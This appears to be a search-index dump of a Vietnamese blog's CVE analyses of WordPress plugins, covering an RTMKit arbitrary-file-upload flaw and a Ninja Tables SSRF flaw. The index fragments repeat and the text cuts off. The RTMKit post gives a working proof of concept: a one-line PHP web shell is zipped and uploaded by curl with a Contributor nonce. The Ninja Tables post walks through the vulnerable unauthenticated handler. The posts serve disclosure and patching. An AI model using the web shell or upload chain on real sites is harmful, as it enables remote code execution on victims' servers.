POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - RTMKit: 1.6.5 (vulnerable) v√† 1.6.6 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Elementor ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rfunction rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('Tidak ada file yang diupload.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Hanya file .zip yang diperbolehkan.'); } $upload_dir = wp_upload_dir(); // path di server $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); // URL publik $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); if (!move_uploaded_file($file['tmp_name'], $tmpFilePath)) { wp_send_json_error('Gagal menyimpan file sementara.'); } $res = $this-\u003etemplate_extract($tmpFileUrl, $file['name'], true); // setelah selesai hapus file if (file_exists($tmpFilePath)) unlink($tmpFilePath); if ($res) { wp_send_json_success('Template berhasil diupload dan diekstrak.'); } else { wp_send_json_error($res); } } function template_extract($url, $id, $return = false) { $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; $tempFile = wp_tempnam($url); $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; $response = wp_remote_get($url, ['timeout' =\u003e 300]); if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); $zip-\u003eextractTo($targetDir); $zip-\u003eclose(); unlink($tempFile); $option = get_option('rtm_template_installed', []); // Default ke array jika tidak ada option if (!is_array($option)) { $option = []; // Pastikan $option adalah array } $option[$hashId] = [ 'template_id' =\u003e $id ]; update_option('rtm_template_installed', $option); // Simpan kembali ke database if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } Trong phi√™n b·∫£n l·ªói: Kh√¥ng ki·ªÉm tra quy·ªÅn ng∆∞·ªùi d√πng h·ª£p l·ªá: ch·ªâ g·ªçi check_ajax_referer() nh∆∞ng kh√¥ng ki·ªÉm tra capability (v√≠ d·ª• current_user_can) ‚Üí user c√≥ nonce h·ª£p l·ªá ho·∫∑c nonce b·ªã l·ªô v·∫´n c√≥ th·ªÉ upload. L∆∞u file t·∫°m v√†o th∆∞ m·ª•c public (wp_upload_dir()): $tmpFilePath n·∫±m trong uploads/ n√™n c√≥ th·ªÉ truy c·∫≠p qua URL ($tmpFileUrl) trong th·ªùi gian file t·ªìn t·∫°i. L·∫•y l·∫°i file qua URL public tr∆∞·ªõc khi gi·∫£i n√©n: template_extract() d√πng wp_remote_get($tmpFileUrl) ‚Üí ph·ª• thu·ªôc v√†o URL c√¥ng khai. Gi·∫£i n√©n tr·ª±c ti·∫øp v√†o th∆∞ m·ª•c public: extractTo($targetDir) trong uploads/rometheme_template ‚Üí n·∫øu file .php ƒë∆∞·ª£c ch√©p l√™n, web server c√≥ th·ªÉ th·ª±c thi. Kh√¥ng whitelist/deny extension: kh√¥ng lo·∫°i b·ªè ho·∫∑c t·ª´ ch·ªëi c√°c file th·ª±c thi (.php, .phtml, .phar, .sh, .exe, ‚Ä¶). Kh√¥ng ki·ªÉm tra n·ªôi dung file (embedded PHP): kh√¥ng c√≥ b∆∞·ªõc ƒë·ªçc/scan ƒë·ªÉ ph√°t hi·ªán \u003c?php tr∆∞·ªõc khi l∆∞u. R·ªßi ro t·∫°m th·ªùi public: v√¨ file t·∫°m l√† public trong su·ªët qu√° tr√¨nh, k·∫ª t·∫•n c√¥ng c√≥ th·ªùi gian truy c·∫≠p/thi·∫øt l·∫≠p payload tr∆∞·ªõc khi file b·ªã unlink. =\u003e Kh·∫£ nƒÉng RCE r·∫•t cao. function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No File Uploaded.'); } if (! current_user_can('manage_options')) { wp_send_json_error( array('message' =\u003e 'Insufficient permissions'), 403 ); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip file allowed.'); } $upload_dir = wp_upload_dir(); // Direktori aman (bukan langsung ke uploads publik) $base_safe_dir = $upload_dir['basedir'] . '//rometheme_template/'; $tmp_dir = $base_safe_dir . 'tmp/'; if (! file_exists($tmp_dir)) { wp_mkdir_p($tmp_dir); // cegah eksekusi file php di folder ini @file_put_contents( $base_safe_dir . '.htaccess', \"Options -Indexes \u003cFilesMatch \".(php|phtml|phar)$\"\u003e Deny from all\u003c/FilesMatch\u003e\" ); } // Buat nama unik untuk zip $unique = wp_generate_password(12, false); $tmp_","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rTrong phi√™n b·∫£n l·ªói, H√†m nh·∫≠n m·ªôt file upload(k·ª≥ v·ªçng .zip), l∆∞u t·∫°m v√†o th∆∞ m·ª•c uploads/, sau ƒë√≥ g·ªçi template_extract() ƒë·ªÉ t·∫£i l·∫°i v√† gi·∫£i n√©n n√≥. Cu·ªëi c√πng x√≥a file t·∫°m v√† tr·∫£ JSON success/fail. C·ª• th·ªÉ: check_ajax_referer('rtm_template_nonce', 'nonce') Gi√∫p b·∫£o v·ªá tr∆∞·ªõc CSRF - ƒë·∫£m b·∫£o request AJAX h·ª£p l·ªá v√† c√≥ nonce. Khi search v·ªõi t·ª´ kh√≥a rtm_template_nonce trong th∆∞ m·ª•c plugin: C√°ch nonce c√≥ action rtm_template_nonce ƒë∆∞·ª£c t·∫°o\rwp_localize_script() s·∫Ω in m·ªôt ƒëo·∫°n \u003cscript\u003e inline v√†o trang v√† trong ƒë√≥ khai b√°o m·ªôt bi·∫øn JS (object) ch·ª©a d·ªØ li·ªáu ƒë∆∞·ª£c truy·ªÅn v√†o. Trong tr∆∞·ªùng h·ª£p n√†y, object l√† rkit_libs l∆∞u tr·ªØ c√°c gi√° tr·ªã logo_url, ajax_url, template_nonce. M·∫πo V√¨ l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi ƒë·∫∑c quy·ªÅn Contributor, th∆∞·ªùng li√™n quan ƒë·∫øn vi·ªác t·∫°o post n√™n ta th·ª≠ t·∫°o post v√† g·ªçi ƒë·ªëi t∆∞·ª£ng rkit_libs t·ª´ console c·ªßa tr√¨nh duy·ªát ƒë·ªÉ l·∫•y gi√° tr·ªã nonce. Th√¥ng tin\rTa edit post b·∫±ng Elementor , v√¨ c√°c widget c·ªßa plugin ƒë∆∞·ª£c s·ª≠ d·ª•ng b·∫±ng Elementor, editor m·∫∑c ƒë·ªãnh kh√¥ng c√≥. L·∫•y nonce t·ª´ console c·ªßa tr√¨nh duy·ªát\rKi·ªÉm tra $_FILES['file'] v√† extension: if (empty($_FILES['file'])) { wp_send_json_error('Tidak ada file yang diupload.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Hanya file .zip yang diperbolehkan.'); } ƒê·∫£m b·∫£o client g·ª≠i file v√† ch·ªâ cho ph√©p upload .zip X√°c ƒë·ªãnh ƒë∆∞·ªùng d·∫´n t·∫°m v√† URL c√¥ng khai $upload_dir = wp_upload_dir(); $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); T·∫°o t√™n file t·∫°m h·ª£p l·ªá trong th∆∞ m·ª•c uploads v√† URL truy c·∫≠p ƒë·∫øn file ƒë√≥, v√≠ d·ª•: $tmpFilePath = \"/var/www/html/wp-content/uploads/rtm_temp_filename.zip\" $tmpFileUrl = \"http://localhost/wp-content/uploads/rtm_temp_filename.zip\" move_uploaded_file($file['tmp_name'], $tmpFilePath) Di chuy·ªÉn file upload t·ª´ tmp PHP v√†o n∆°i t·∫°m ƒë·ªãnh nghƒ©a. G·ªçi template_extract($tmpFileUrl, $file['name'], true) function template_extract($url, $id, $return = false) { // L·∫•y th∆∞ m·ª•c upload c·ªßa WordPress v√† t·∫°o th∆∞ m·ª•c l∆∞u template $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; // T·∫°o file t·∫°m ƒë·ªÉ t·∫£i file t·ª´ URL v·ªÅ $tempFile = wp_tempnam($url); // T·∫°o hash ID cho template $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; // T·∫£i file t·ª´ URL $response = wp_remote_get($url, ['timeout' =\u003e 300]); // Ki·ªÉm tra l·ªói trong qu√° tr√¨nh t·∫£i file if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } // L∆∞u n·ªôi dung c·ªßa file ZIP v√†o file t·∫°m $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); // M·ªü file ZIP v√† gi·∫£i n√©n v√†o th∆∞ m·ª•c m·ª•c ti√™u $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); // T·∫°o th∆∞ m·ª•c n·∫øu ch∆∞a c√≥ $zip-\u003eextractTo($targetDir); // Gi·∫£i n√©n v√†o th∆∞ m·ª•c m·ª•c ti√™u $zip-\u003eclose(); unlink($tempFile); // X√≥a file t·∫°m // C·∫≠p nh·∫≠t t√πy ch·ªçn 'rtm_template_installed' trong database $option = get_option('rtm_template_installed', []); if (!is_array($option)) { $option = []; } $option[$hashId] = ['template_id' =\u003e $id]; update_option('rtm_template_installed', $option); // Tr·∫£ v·ªÅ k·∫øt qu·∫£ if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } Th√¥ng tin\r·ªû ƒë√¢y file kh√¥ng ƒë∆∞·ª£c gi·∫£i n√©n th·∫≥ng n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t Zip Slip ƒë·ªÉ di chuy·ªÉn file v√†o th∆∞ m·ª•c cao h∆°n. Cu·ªëi c√πng file ƒë∆∞·ª£c l∆∞u trong trong {wp_upload_dir}/rometheme_template/{hashId}/ Tr·∫£ v·ªÅ JSON rtm_handle_upload_template() ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook: add_action('wp_ajax_rtm_handle_upload_template', [$this, 'rtm_handle_upload_template']); C√≥ nghƒ©a l√†: Khi ng∆∞·ªùi d√πng g·ª≠i y√™u c·∫ßu AJAX ƒë·∫øn wp-admin/admin-ajax.php v·ªõi action=rtm_handle_upload_template, h√†m rtm_handle_upload_template() s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω y√™u c·∫ßu. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\r","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rƒêƒÉng nh·∫≠p b√†i t√†i kho·∫£n Contributor T·∫°o post v√† edit b·∫±ng Elementor G·ªçi rkit_libs.template_nonce ƒë·ªÉ l·∫•y nonce T·∫°o file ƒë·ªÉ RCE \u003c?php system($_GET['cmd']) ?\u003e N√©n file v·ª´a t·∫°o zip rce.zip rce.php G·ª≠i request upload file curl -X POST \"http://localhost/wp-admin/admin-ajax.php\" \\ -b \"your_cookie\" \\ -F \"action=rtm_handle_upload_template\" \\ -F \"nonce=your_nonce\" \\ -F \"file=@rce.zip;filename=rce.zip;type=application/zip\" Truy c·∫≠p file v·ª´a upload RCE v·ªõi file upload\rC√¢u h·ªèi\rƒêi·ªÅu t√¥i mu·ªën nh·∫•n m·∫°nh l√†, m·∫∑c d√π t·ªáp n√†y c√≥ th·ªÉ truy c·∫≠p th·∫≥ng, nh∆∞ng vi·ªác truy c·∫≠p tr·ª±c ti·∫øp v·∫´n b·ªã h·∫°n ch·∫ø b·ªüi hashid, do WordPress m·∫∑c ƒë·ªãnh kh√¥ng cho ph√©p li·ªát k√™ n·ªôi dung th∆∞ m·ª•c. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng l√† chu·ªói: Arbitrary File Upload + file t·∫°m public + gi·∫£i n√©n thi·∫øu ki·ªÉm so√°t ‚Üí r·ªßi ro RCE. B·∫£n v√° (1.6.6) kh·∫Øc ph·ª•c b·∫±ng ki·ªÉm tra quy·ªÅn, l∆∞u t·∫°m kh√¥ng public, whitelist ext, ch·∫∑n traversal v√† scan n·ªôi dung. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways\rC·∫≠p nh·∫≠t l√™n 1.6.6 ngay. N·∫øu ch∆∞a c·∫≠p nh·∫≠t: v√¥ hi·ªáu ho√° upload template ho·∫∑c gi·ªõi h·∫°n ch·ªâ admin. Lu√¥n l∆∞u file upload ·ªü n∆°i kh√¥ng public, whitelist ext, ch·∫∑n path traversal v√† scan n·ªôi dung tr∆∞·ªõc khi gi·∫£i n√©n. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress RTMKit Plugin \u003c= 1.6.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables Plugin.","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Ninja Tables ‚Äì Easy Data Table Builder cho WordPress t·ªìn t·∫°i l·ªó h·ªïng Server-Side Request Forgery (SSRF) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn v√† bao g·ªìm 5.0.18, th√¥ng qua tham s·ªë args[url]. L·ªó h·ªïng n√†y cho ph√©p unauthenticated attackers th·ª±c hi·ªán c√°c web requests ƒë·∫øn c√°c arbitrary locations b·∫Øt ngu·ªìn t·ª´ web application, v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ query v√† modify th√¥ng tin t·ª´ c√°c internal services. CVE ID: CVE-2025-2940 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Ninja Tables Plugin ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Ninja Tables: 5.0.18 (vulnerable) v√† 5.0.19 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff\rTheo m√¥ t·∫£ c·ªßa CVE, v·ªã tr√≠ ƒë√°ng ch√∫ √Ω trong patch l√† ch·ªó m√£ x·ª≠ l√Ω args[url] ‚Äî ƒë√¢y c√≥ th·ªÉ l√† nguy√™n nh√¢n ch√≠nh d·∫´n ƒë·∫øn l·ªó h·ªïng v√¨ tham s·ªë n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp trong lu·ªìng th·ª±c hi·ªán request. V·ªã tr√≠ ti·ªÅn ƒë·ªÅ g√¢y ra l·ªó h·ªïng\rTrong b·∫£n v√°, ƒëo·∫°n m√£ d·ªÖ b·ªã l·ª£i d·ª•ng n√†y ƒë√£ ƒë∆∞·ª£c v√¥ hi·ªáu ho√° (comment b·∫±ng //). ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rpublic static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); $response = $client-\u003e{$requestMethod}('', $params); if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); }); } H√†m registerAsyncRequestHandler() l√† m·ªôt tr√¨nh ƒëƒÉng k√Ω ƒë·ªÉ t·∫°o v√† x·ª≠ l√Ω m·ªôt endpoint async trong WordPress - c·ª• th·ªÉ l√† qua admin_post_nopriv_{action}, t·ª©c l√† hook cho ph√©p ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p (nopriv) c≈©ng c√≥ th·ªÉ g·ª≠i request ƒë·∫øn. C·ª• th·ªÉ, h√†m s·∫Ω x·ª≠ l√Ω nh∆∞ sau: T·∫°o t√™n action duy nh·∫•t cho plugin $action = static::makeAsyncRequestAction(); protected static function makeAsyncRequestAction() { return 'wpf-async-request-' . sha1( App::config()-\u003eget('app.slug') // plugin name: ninja-tables ); } H√†m makeAsyncRequestAction() t·∫°o ra m·ªôt chu·ªói ƒë·ªãnh danh duy nh·∫•t cho plugin b·∫±ng c√°ch n·ªëi ti·ªÅn t·ªë c·ªë ƒë·ªãnh (wpf-async-request-) v·ªõi gi√° tr·ªã SHA1 hash c·ªßa t√™n plugin (app.slug). V√¨ plugin hi·ªán t·∫°i c√≥ t√™n l√† \"ninja-tables\", n√™n k·∫øt qu·∫£ tr·∫£ v·ªÅ s·∫Ω l√†: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 ƒêƒÉng k√Ω action hook v·ªõi callback l√† Anonymous function App::addAction(\"admin_post_nopriv_{$action}\", function() { ... }); Khi c√≥ HTTP request g·ª≠i ƒë·∫øn endpoint /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 th√¨ logic trong anonymous function s·∫Ω ƒë∆∞·ª£c g·ªçi. L·∫•y instance c·ªßa Request object t·ª´ container App v√† l·∫•y 2 tham s·ªë ch√≠nh $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); Kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng Client v·ªõi baseUrl l·∫•y t·ª´ request $client = Client::make($requestUrl); public static function make($baseUrl = '', $args = []) { $args['cookies'] = $args['cookies'] ?? []; $args['headers'] = $args['headers'] ?? []; $args['options'] = $args['options'] ?? []; return new static($baseUrl, $args); } Ph∆∞∆°ng th·ª©c Client::make() ch·ªãu tr√°ch nhi·ªám t·∫°o v√† c·∫•u h√¨nh m·ªôt instance m·ªõi c·ªßa l·ªõp Client, d√πng ƒë·ªÉ qu·∫£n l√Ω v√† g·ª≠i c√°c HTTP request. Gi√° tr·ªã $baseUrl ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp t·ª´ $requestUrl - t·ª©c l√† URL m√† ng∆∞·ªùi d√πng cung c·∫•p trong tham s·ªë args.url. L·∫•y t·∫•t c·∫£ tham s·ªë kh√°c ngo√†i action, args.url, args.method $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; Gi·∫£i m√£ v√† l·∫•y h√†m callback t·ª´ tham s·ªë request $callback = static::getCallback($params); protected static function getCallback(\u0026$params) { $callback = unserialize(base64_decode($params['callback'])); unset($params['callback']); return $callback; } Ph∆∞∆°ng th·ª©c getCallback() d√πng ƒë·ªÉ tr√≠ch xu·∫•t h√†m callback ƒë∆∞·ª£c g·ª≠i k√®m trong tham s·ªë args.callback c·ªßa request. G·ªçi ƒë·∫øn h√†m $requestMethod v·ªõi ƒë·ªëi s·ªë $params $response = $client-\u003e{$requestMethod}('', $params); V√≠ d·ª•: $requestMethod l√† POST =\u003e $response = $client-\u003ePOST('', $params) Ki·ªÉm tra l·ªói v√† tr·∫£ v·ªÅ if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); C√¢u h·ªèi\rƒêi·ªÅu g√¨ x·∫£y ra n·∫øu $requestMethod kh√¥ng t·ªìn t·∫°i, t·ª©c $client g·ªçi ƒë·∫øn m·ªôt ph∆∞∆°ng th·ª©c kh√¥ng c√≥ trong class Client? Trong tr∆∞·ªùng h·ª£p n√†y, PHP s·∫Ω t·ª± ƒë·ªông g·ªçi h√†m magic __call() ƒë∆∞·ª£c khai b√°o trong class Client. H√†m __call() ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ x·ª≠ l√Ω t·∫•t c·∫£ c√°c l·ªùi g·ªçi ph∆∞∆°ng th·ª©c kh√¥ng t·ªìn t·∫°i, cho ph√©p Client th·ª±c hi·ªán request ƒë·ªông d·ª±a tr√™n t√™n ph∆∞∆°ng th·ª©c ƒë∆∞·ª£c g·ªçi. Quan s√°t Outline tab ta th·∫•y ƒë∆∞·ª£c t·∫•t c·∫£ c√°c method, property v√† c√°c h√†m trong file theo th·ª© t·ª±. Outline c·ªßa file Client.php\rpublic function __call($method, $args) { if ($method === 'download') { return $this-\u003edownloadFile(...$args); } // Handles dynamic method calls like: // a","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() ‚Üí request() ‚Üí wp_remote_request() ‚Üê SSRF sink\"]\rE --\u003e F[\"Response ‚Üí callback ‚Üí HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() ‚Üí request() ‚Üí wp_remote_request() ‚Üê SSRF sink\"]\rE --\u003e F[\"Response ‚Üí callback ‚Üí HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() ‚Üí request() ‚Üí wp_remote_request() ‚Üê SSRF sink\"]\rE --\u003e F[\"Response ‚Üí callback ‚Üí HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() ‚Üí request() ‚Üí wp_remote_request() ‚Üê SSRF sink\"]\rE --\u003e F[\"Response ‚Üí callback ‚Üí HTTP Response\"]\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 